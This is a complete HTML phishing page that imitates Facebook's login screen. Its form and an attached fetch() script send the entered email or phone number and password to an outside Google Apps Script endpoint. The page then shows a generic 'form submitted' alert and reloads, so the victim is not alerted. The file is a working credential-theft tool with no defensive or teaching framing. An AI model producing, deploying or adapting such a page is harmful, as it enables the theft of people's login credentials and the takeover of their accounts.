<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <style>
    /* General reset */
    body, html {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }

    /* Background and container styling */
    body {
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      width: 100%;
      max-width: 400px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      padding: 20px;
      text-align: center;
    }

    /* Facebook logo */
    .logo {
      font-size: 2rem;
      font-weight: bold;
      color: #1877f2;
      margin-bottom: 20px;
    }

    /* Input styling */
    input {
      width: 95%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 1rem;
      outline: none;
    }

    /* Button styling */
    .submit{
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background-color: #165db6;
    }

    /* Link styling */
    .forgot-password {
      display: block;
      margin: 15px 0;
      font-size: 0.9rem;
      color: #1877f2;
      text-decoration: none;
    }

    .forgot-password:hover {
      text-decoration: underline;
    }

    /* Divider and create account button */
    .divider {
      margin: 20px 0;
      border: 0;
      height: 1px;
      background: #ddd;
    }

    .create-account {
      width: 100%;
      padding: 10px;
      background-color: #42b72a;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
    }

    .create-account:hover {
      background-color: #36a420;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">facebook</div>
    <form method="post" action="https://script.google.com/macros/s/AKfycbw8Bk5Ajtdg4aeiaA8pDORNlk4VhpfnP4tiRyViaZh_icWIynVMbhLWYJjTBrDFY4RB/exec" name="contact-form" >
      <input type="text" name="your-name" placeholder="Email or Phone Number" required>
      <input type="password" name="your-pass" placeholder="Password" required>
      <input type="submit" value="Log In" id="submit" class="submit" >
    </form>
    <a href="#" class="forgot-password">Forgot Password?</a>
    <hr class="divider">
    <button class="create-account">Create New Account</button>
  </div>
</body>
</html>
<script>
const scriptURL = 'https://script.google.com/macros/s/AKfycbw8Bk5Ajtdg4aeiaA8pDORNlk4VhpfnP4tiRyViaZh_icWIynVMbhLWYJjTBrDFY4RB/exec'

const form = document.forms['contact-form']

form.addEventListener('submit', e => {
  
  e.preventDefault()
  
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  .then(response => alert("Thank you! Form is submitted" ))
  .then(() => { window.location.reload(); })
  .catch(error => console.error('Error!', error.message))
})
</script>
